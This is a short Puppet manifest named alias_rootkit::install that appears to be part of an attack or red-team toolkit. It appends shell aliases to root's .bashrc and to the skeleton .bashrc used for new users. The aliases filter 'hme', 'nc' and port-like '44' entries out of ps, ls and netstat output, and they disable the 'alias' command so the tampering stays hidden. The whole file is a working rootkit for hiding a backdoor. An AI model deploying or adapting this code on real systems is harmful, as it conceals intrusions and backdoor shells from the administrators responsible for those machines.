class alias_rootkit::install {

  $aliases = "alias ps='f(){ ps \"$@\" |grep -v 'hme\|nc'; unset -f f; }; f'; alias ls='f(){ ls \"$@\" |grep -v hme |column -c 80; unset -f f; }; f'; alias netstat='f(){ netstat \"$@\" |grep -v 44|grep -v hme; unset -f f; }; f'; alias alias='true'"

  file_line { 'Append a line to /etc/skel/.bashrc':
    path => '/etc/skel/.bashrc',
    line => $aliases,
  }
  file_line { 'Append a line to /root/.bashrc':
    path => '/root/.bashrc',
    line => $aliases,
  }

}
